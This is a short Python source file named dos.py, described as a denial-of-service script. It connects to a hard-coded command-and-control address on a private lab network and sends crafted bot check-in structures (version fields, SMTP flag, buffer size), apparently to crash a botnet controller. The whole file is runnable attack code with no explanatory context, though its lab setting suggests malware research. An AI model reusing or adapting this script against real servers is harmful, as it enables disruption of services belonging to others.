# dos.py

"""
Description:

Denial of Service script

"""

import sys
import socket

from c_types_defines import *

# C&C connection IP and Port number
HOST = "172.16.211.134"
PORT = 43242

def main():
    # Socket configurations
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.settimeout(10.0)

    # Connect
    s.connect((HOST, PORT))

    # Initialise bot_info, bot_rheader, botbulk_info structures
    bot_info = BOT_INFO()
    bot_rheader = BOT_RHEADER()

    # Populate bot_rheader structure
    bot_rheader.bid     = 0
    bot_rheader.iplocal = 30609580 # Should be INT
    bot_rheader.botver  = 116
    bot_rheader.confver = 198
    bot_rheader.mfver   = 1
    bot_rheader.winver  = 1
    bot_rheader.flags   = 1
    bot_rheader.smtp    = 1
    bot_rheader.size    = 32

    # Conversion: Structure -> Bytes (Str)
    bot_info.bufrecv = buffer(bot_rheader)[:] # Same as pack()

    # Populate bot_info structure
    bot_info.ip                 = "\254\020\323\001" # char[4]
    bot_info.have_ip            = 1
    bot_info.bufsize            = 32
    
    # Send data (BOT_RHEADER followed by BOT_INFO)
    data = buffer(bot_rheader)[:] + buffer(bot_info)[:]
    s.sendall(data)

    while True:
        try:
            s.recv(1024)
        except socket.timeout:
            break

    # Close socket
    s.close()

    # Exit program
    exit(0)

if __name__ == "__main__":
    main()

